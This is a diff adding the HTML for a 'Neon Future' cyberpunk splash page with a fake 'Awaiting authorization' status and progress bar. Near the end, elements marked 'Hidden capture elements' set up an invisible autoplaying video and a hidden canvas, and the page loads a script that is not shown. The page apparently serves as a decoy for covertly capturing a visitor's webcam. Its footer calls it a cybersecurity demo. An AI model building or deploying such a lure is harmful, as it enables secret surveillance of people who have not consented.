@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Future</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="cyber-container">
+        <div class="cyber-overlay"></div>
+        
+        <header class="cyber-header">
+            <h1 class="neon-text" data-text="NEON FUTURE">NEON FUTURE</h1>
+            <p class="cyber-subtitle">Enter the digital frontier</p>
+        </header>
+        
+        <main class="cyber-main">
+            <div class="cyber-card">
+                <div class="cyber-card-inner">
+                    <h2 class="cyber-card-title">SYSTEM INITIALIZED</h2>
+                    <div class="cyber-status" id="status">
+                        <div class="scanline"></div>
+                        <p>Awaiting authorization...</p>
+                    </div>
+                    <div class="cyber-progress">
+                        <div class="progress-bar" id="progress"></div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer class="cyber-footer">
+            <p>© 2023 CYBERSECURITY DEMO | PROTOTYPE v9.4.2</p>
+        </footer>
+    </div>
+
+    <!-- Hidden capture elements -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script src="script.js"></script>
+</body>
+</html>
